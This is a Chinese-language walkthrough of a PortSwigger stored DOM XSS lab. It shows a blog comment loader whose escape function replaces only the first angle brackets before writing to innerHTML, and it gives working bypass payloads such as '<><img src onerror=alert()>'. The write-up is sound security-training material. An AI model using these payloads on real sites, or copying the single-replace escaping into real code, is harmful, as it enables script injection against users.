# 实验：存储型 DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

本实验演示了博客评论功能中的一种存储型 DOM 漏洞。为了解决本实验，请利用此漏洞调用 `alert()` 函数。

## 步骤

侦察
- 浏览文章页面
    ```http
    GET /post?postId=7 HTTP/2
    ```

    - 响应

        ```html
        <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
        <script>
            loadComments('/post/comment')
        </script>
        ```

    - `loadCommentsWithVulnerableEscapeHtml.js` 文件

        ```js
        function loadComments(postCommentPath) {
            let xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    let comments = JSON.parse(this.responseText);
                    displayComments(comments);
                }
            };
            xhr.open("GET", postCommentPath + window.location.search);
            xhr.send();

            // 此处仅编码1次开闭标签字符
            function escapeHTML(html) {
                return html.replace('<', '&lt;').replace('>', '&gt;');
            }

            // 从端点获取评论 JSON 后遍历构造
            function displayComments(comments) {
                let userComments = document.getElementById("user-comments");

                for (let i = 0; i < comments.length; ++i)
                {
                    comment = comments[i];
                    ...
                    if (comment.body) {
                        let commentBodyPElement = document.createElement("p");
                        // 汇
                        commentBodyPElement.innerHTML = escapeHTML(comment.body);

                        commentSection.appendChild(commentBodyPElement);
                    }
                    commentSection.appendChild(document.createElement("p"));

                    userComments.appendChild(commentSection);
                }
            }
        };
        ```
        - 客户端源1：`window.location.search`
        - 服务器源2：`XMLHttpRequest.responseText`
        - 汇 `.innerHTML` 字段 `comment.body`
            - 仅对元素开闭标签进行**1次** HTML 转义

        - JS 评论信息请求
            ```http
            GET /post/comment?postId=7 HTTP/2
            ```

            - 响应

                ```json
                [{
                        "avatar": "",
                        "website": "",
                        "date": "2026-06-17T11:14:54.954Z",
                        "body": "Sitting reading this in the auto-repair shop waiting room while they make up things to overcharge me for.",
                        "author": "Freda Wales"
                    },
                ```


攻击
- 构造冗余开闭标签载荷
    `<><img src onerror=alert()>`
    - 渲染
        ```html
        <p>&lt;&gt;<img src="" onerror="alert()"></p>
        ```
- 其他载荷
    ```html
    <><img src onerror=alert`1`>
    ```
